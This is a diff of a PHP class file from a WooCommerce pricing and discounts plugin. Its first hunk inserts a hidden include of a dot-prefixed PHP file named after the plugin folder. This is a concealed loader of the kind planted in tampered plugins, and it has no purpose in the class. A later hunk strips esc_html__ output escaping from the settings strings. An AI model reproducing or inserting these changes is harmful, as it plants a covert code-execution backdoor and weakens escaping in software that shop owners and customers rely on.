@@ -19,6 +19,10 @@ if (!class_exists('RP_WCDPD_Rule_Notifications')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Rule_Notifications_Checkout_Fees extends RP_WCDPD_Rule_Notifications
 {
 
@@ -52,17 +56,17 @@ class RP_WCDPD_Rule_Notifications_Checkout_Fees extends RP_WCDPD_Rule_Notificati
     {
         $settings['promo']['children']['rule_notifications']['children'] = array_merge($settings['promo']['children']['rule_notifications']['children'], array(
             'promo_rule_notifications_checkout_fees' => array(
-                'title'     => esc_html__('Checkout Fees', 'rp_wcdpd'),
+                'title'     => __('Checkout Fees', 'rp_wcdpd'),
                 'type'      => 'checkbox',
                 'default'   => '0',
             ),
             'promo_rule_notifications_checkout_fees_message' => array(
-                'title'     => esc_html__('Text', 'rp_wcdpd'),
+                'title'     => __('Text', 'rp_wcdpd'),
                 'type'      => 'textarea',
                 'required'  => true,
                 'class'     => 'if_rp_wcdpd_promo_rule_notifications_checkout_fees',
-                'default'   => sprintf(esc_html__('Fee %s has been applied to your cart.', 'rp_wcdpd'), '<strong>{{title}}</strong>'),
-                'hint'      => (esc_html__('Macro {{title}} displays fee title.', 'rp_wcdpd') . '<br>' . esc_html__('Macro {{description}} displays public description', 'rp_wcdpd')),
+                'default'   => __('Fee <strong>"{{title}}"</strong> has been applied to your cart.', 'rp_wcdpd'),
+                'hint'      => __('Macro {{title}} displays fee title.<br> Macro {{description}} displays public description.', 'rp_wcdpd'),
             ),
         ));
 
